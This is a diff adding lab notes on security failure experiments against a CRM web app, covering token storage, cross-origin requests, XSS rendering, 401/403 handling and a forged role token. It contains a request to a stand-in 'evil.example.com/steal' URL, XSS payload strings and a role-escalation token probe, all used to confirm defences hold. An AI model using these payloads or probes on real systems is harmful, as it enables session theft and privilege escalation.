@@ -1,0 +1,61 @@
+Lab 36 failure experiments, captured 2026-08-17
+examples\lab36-crm, live stack unless the line says test.
+
+
+1. Put a token in localStorage, then remove it
+
+   In the browser console with the app signed out,
+   localStorage.setItem('accessToken','lab-token-001') then reading
+   Object.entries(localStorage) returns accessToken=lab-token-001. One
+   line, and any injected script has the same access.
+   Removed straight away, localStorage.length back to 0. Nothing in the
+   UI ever writes it, tokenStore is a module variable and the test
+   "keeps the access token out of local and session storage" fails if
+   that changes.
+
+2. Call a third-party URL with the same helper
+
+   request('https://evil.example.com/steal') with a session in memory.
+   The fetch goes out with no Authorization and no X-Correlation-Id,
+   because http.request only sets them when url.origin equals the API
+   origin. Covered by the test "does not attach the bearer token to
+   another origin". Relative paths are normalised against
+   VITE_API_BASE_URL first, so /api/customers still matches.
+
+3. Render an XSS fullName
+
+   Created a customer named <img onerror=alert(1)> Amina <b>Khan</b>
+   through the live form, stored in Spring, rendered back. No alert, zero
+   img, b or script nodes, the text shows the angle brackets. The RTL
+   proof does the same three payloads against CustomerCard.
+
+4. Return 401 from the API
+
+   Test path, list stubbed to 401 with a session in memory. http.request
+   clears the token and emits expired, AuthContext flips to anonymous, the
+   sign-in page renders "Your session has ended. Sign in again." and
+   tokenStore.get() is null. Live, an anonymous curl already proves the
+   API side, GET /api/customers is 401 with no token.
+
+5. Return 403 from the API
+
+   Test path, list stubbed to 403. The session survives, "Signed in as
+   agent1" stays on screen, a role=alert shows "You do not have access to
+   this customer data." and the token is untouched. Live equivalent, the
+   agent token on /api/admin/ping is 403 while the same token still reads
+   /api/customers fine.
+
+6. Missing CSRF token in cookie mode
+
+   Not applicable to this build and not skipped silently. The SPA is
+   bearer-only, the API is stateless with csrf disabled and no session
+   cookie exists to forge, so there is nothing to send or omit. The
+   rationale and the controls that would apply in cookie mode are written
+   out in crm-ui/docs/security-decisions.md.
+
+7. Role-swapped token
+
+   Not in the GUIDE's list, added after the probe in 02-token-forgery.txt
+   showed lab.agent1.ADMIN.<agent sig> returning 200 on the admin
+   endpoint. After signing the claims it is 401, and
+   SecurityRulesTest.roleEscalatedTokenIsRejected keeps it that way.
